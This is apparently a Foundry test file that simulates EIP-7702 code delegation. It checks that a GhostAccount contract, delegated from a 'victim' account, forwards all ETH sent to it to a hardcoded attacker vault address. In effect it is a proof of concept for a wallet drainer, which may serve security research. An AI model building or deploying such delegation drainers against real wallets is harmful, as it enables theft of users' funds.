// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import "../src/GhostAccount.sol";

contract GhostAccountTest is Test {
    GhostAccount public implementation;
    address public victimEOA = makeAddr("victim");
    address public attackerVault = 0x678F7fb42BcC819285EfE21fDA421E67B2F45839;

    function setUp() public {
        implementation = new GhostAccount();
        vm.deal(victimEOA, 1 ether);
    }

    /**
     * @notice Simulates the EIP-7702 Code Delegation behavior.
     */
    function test_EIP7702_AutoForwarding() public {
        // According to EIP-7702, delegated code is represented by:
        // 0xef0100 + <implementation_address>
        bytes memory eip7702Bytecode = abi.encodePacked(
            hex"ef0100", 
            address(implementation)
        );

        // 'etch' simulates the EOA having the delegation pointer
        vm.etch(victimEOA, eip7702Bytecode);

        // A third party sends ETH to the victim
        address sender = makeAddr("sender");
        vm.deal(sender, 10 ether);

        vm.prank(sender);
        (bool success, ) = victimEOA.call{value: 5 ether}("");
        require(success);

        // VERIFICATION:
        // Victim balance must be 0 (everything forwarded)
        // Vault balance must be 6 ether
        assertEq(victimEOA.balance, 0);
        assertEq(attackerVault.balance, 6 ether);
    }
}